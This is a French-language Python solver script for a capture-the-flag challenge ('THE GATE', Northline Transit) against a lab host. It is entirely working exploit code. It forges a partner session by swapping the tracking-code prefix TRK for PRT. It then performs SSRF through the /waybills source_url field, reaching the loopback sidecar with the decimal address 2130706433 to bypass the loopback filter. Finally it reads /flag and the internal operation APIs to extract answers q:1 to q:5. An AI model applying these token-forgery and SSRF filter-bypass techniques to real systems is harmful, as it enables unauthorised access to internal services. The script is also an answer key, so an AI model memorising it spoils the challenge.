#!/usr/bin/env python3
"""Solveur — THE GATE (Northline Transit, q:1).

Chaîne d'attaque :
  1. (optionnel) décoder le QR du reçu pour récupérer le code de suivi TRK.*
  2. rejouer identifiant+intégrité avec le préfixe PRT -> session partenaire
  3. SSRF via /waybills (source_url) vers le sidecar 127.0.0.1:8081,
     en contournant le blocage loopback par la forme décimale 2130706433
  4. lire /docs puis /flag et afficher la réponse de coordination

Usage :
  python3 solveur.py --target http://172.28.38.2:8080
  python3 solveur.py --target http://172.28.38.2:8080 --qr recu_northline.png
  python3 solveur.py --target ... --code TRK.<id>.<integrite>

Dépendances : requests (pip install requests) ; zbarimg facultatif pour --qr.
"""

from __future__ import annotations

import argparse
import html
import json
import re
import shutil
import subprocess
import sys

try:
    import requests
except ImportError:  # pragma: no cover
    sys.exit("requests manquant : pip install requests")

# 127.0.0.1 en notation décimale : contourne les filtres qui bloquent
# uniquement les chaînes "127.0.0.1" / "localhost".
DECIMAL_LOOPBACK = "2130706433"
SIDECAR_PORT = 8081


def decode_qr(path: str) -> str | None:
    """Extrait l'URL de suivi du QR du reçu via zbarimg."""
    if not shutil.which("zbarimg"):
        print("[!] zbarimg introuvable, --qr ignoré", file=sys.stderr)
        return None
    out = subprocess.run(
        ["zbarimg", "--raw", "-q", path],
        capture_output=True,
        text=True,
        check=False,
    ).stdout
    m = re.search(r"(https?://\S+)", out)
    return m.group(1).strip() if m else None


def tracking_code_from_url(url: str) -> str | None:
    """Récupère TRK.<id>.<integrite> depuis /track/<code>."""
    m = re.search(r"/track/([A-Za-z0-9]+\.[0-9a-fA-F]+\.[0-9a-fA-F]+)", url)
    return m.group(1) if m else None


def partner_code(tracking_code: str) -> str:
    """Remplace le préfixe TRK par PRT (l'intégrité ne dépend que de l'id)."""
    prefix, ident, integrity = tracking_code.split(".")
    if prefix != "TRK":
        print(f"[i] préfixe inattendu {prefix!r}, on force PRT", file=sys.stderr)
    return f"PRT.{ident}.{integrity}"


def preview_json(page: str) -> dict:
    """Extrait et décode le JSON affiché dans <pre class="preview">."""
    m = re.search(r'<pre class="preview">(.*?)</pre>', page, re.S)
    if not m:
        raise ValueError("aucun aperçu dans la réponse")
    raw = html.unescape(m.group(1)).strip()
    return json.loads(raw)


def ssrf(session: requests.Session, base: str, url: str) -> str:
    r = session.post(
        f"{base}/waybills",
        data={"source_url": url},
        timeout=20,
        allow_redirects=True,
    )
    r.raise_for_status()
    return r.text


def alert(page: str) -> str | None:
    m = re.search(r'class="alert">([^<]*)', page)
    return html.unescape(m.group(1)).strip() if m else None


def main() -> int:
    ap = argparse.ArgumentParser(description="Solveur THE GATE (q:1)")
    ap.add_argument("--target", required=True, help="ex. http://172.28.38.2:8080")
    ap.add_argument("--qr", help="image du reçu (recu_northline.png)")
    ap.add_argument("--code", help="code de suivi TRK.<id>.<integrite>")
    ap.add_argument(
        "--show-docs", action="store_true", help="afficher aussi la spec /docs"
    )
    ap.add_argument(
        "--q2",
        action="store_true",
        help="q:2 INTERNAL DISPATCH : afficher l'identifiant de session du dashboard",
    )
    ap.add_argument(
        "--q3",
        action="store_true",
        help="q:3 THE PASSENGER : afficher la couverture du voyageur (OP-24-7319)",
    )
    ap.add_argument(
        "--operation",
        default="OP-24-7319",
        help="opération à interroger pour --q3/--q4 (défaut : OP-24-7319)",
    )
    ap.add_argument(
        "--q4",
        action="store_true",
        help="q:4 WINDOW : afficher la fenêtre de l'affectation active",
    )
    ap.add_argument(
        "--q5",
        action="store_true",
        help="q:5 PICKUP : afficher le lieu de prise en charge de Crown",
    )
    args = ap.parse_args()

    base = args.target.rstrip("/")
    code = args.code

    if not code and args.qr:
        url = decode_qr(args.qr)
        if url:
            print(f"[+] QR : {url}")
            code = tracking_code_from_url(url)
    if not code:
        sys.exit("code de suivi manquant : fournir --code ou --qr")

    pcode = partner_code(code)
    print(f"[+] code partenaire : {pcode}")

    s = requests.Session()
    r = s.post(f"{base}/login", data={"code": pcode}, timeout=15, allow_redirects=False)
    print(f"[+] POST /login -> {r.status_code}")
    if r.status_code != 302:
        body = alert(r.text) or "échec inconnu"
        print(f"[-] connexion refusée : {body}")
        return 1

    dash = s.get(f"{base}/dashboard", timeout=15)
    who = re.search(r"<b>([^<]+)</b>\s*<small>Compte partenaire", dash.text)
    print(f"[+] session partenaire : {who.group(1) if who else 'inconnue'}")

    if args.q2:
        m = re.search(
            r'<section class="flag-card">.*?<code>([^<]+)</code>', dash.text, re.S
        )
        if not m:
            print("[-] identifiant de session introuvable sur /dashboard")
            return 1
        print(f"[+] FLAG q:2 : {html.unescape(m.group(1))}")
        return 0

    sidecar = f"http://{DECIMAL_LOOPBACK}:{SIDECAR_PORT}"

    if args.q3:
        raw = preview_json(ssrf(s, base, f"{sidecar}/api/operations/{args.operation}"))
        traveller = raw.get("traveller") or {}
        if not traveller.get("cover_name"):
            print(f"[-] pas de voyageur sur {args.operation} : {raw}")
            return 1
        print(f"[+] opération   : {raw.get('operation_id')}")
        print(f"[+] expédition  : {raw.get('shipment_reference')}")
        print(f"[+] identité    : {traveller.get('identity')} ({traveller.get('traveller_id')})")
        print(f"[+] destination : {(raw.get('destination') or {}).get('final_destination')}")
        print(f"[+] FLAG q:3    : {traveller['cover_name']}")
        return 0

    if args.q4:
        raw = preview_json(
            ssrf(s, base, f"{sidecar}/api/operations/{args.operation}/assignments")
        )
        active = [a for a in raw.get("assignments", []) if a.get("status") == "active"]
        if not active:
            print(f"[-] aucune affectation active sur {args.operation} : {raw}")
            return 1
        for a in active:
            print(f"[+] affectation : {a.get('id')} ({a.get('vehicle')})")
            print(f"[+] point       : {a.get('meeting_point')}")
            print(f"[+] début (UTC) : {a.get('time_start')}")
            print(f"[+] fin   (UTC) : {a.get('time_end')}")
        print(f"[+] FLAG q:4    : {active[0]['time_start']} -> {active[0]['time_end']}")
        return 0

    if args.q5:
        dossier = preview_json(
            ssrf(s, base, f"{sidecar}/api/operations/{args.operation}")
        )
        raw = preview_json(
            ssrf(s, base, f"{sidecar}/api/operations/{args.operation}/assignments")
        )
        active = [a for a in raw.get("assignments", []) if a.get("status") == "active"]
        if not active:
            print(f"[-] aucune affectation active sur {args.operation} : {raw}")
            return 1
        place = (dossier.get("destination") or {}).get("meeting_point")
        print(f"[+] point (dossier)   : {place!r}")
        print(f"[+] point (affectation): {active[0].get('meeting_point')!r}")
        print(f"[+] cohérent          : {place == active[0].get('meeting_point')}")
        # L'énoncé attend le lieu principal, pas la précision après le tiret.
        print(f"[+] lieu principal    : {place.split('—')[0].strip()}")
        return 0

    page = ssrf(s, base, sidecar + "/")
    print(f"[+] SSRF sidecar racine : {alert(page) or 'pas d alerte'}")

    docs_page = ssrf(s, base, sidecar + "/docs")
    docs = preview_json(docs_page)
    print(f"[+] service : {docs.get('service')} v{docs.get('version')}")
    if args.show_docs:
        print(json.dumps(docs, indent=2, ensure_ascii=False))

    flag_page = ssrf(s, base, sidecar + "/flag")
    data = preview_json(flag_page)
    if data.get("status") != "ok" or "flag" not in data:
        print(f"[-] réponse inattendue : {data}")
        return 1

    print(f"[+] service : {data.get('service')}")
    print(f"[+] FLAG q:1 : {data['flag']}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
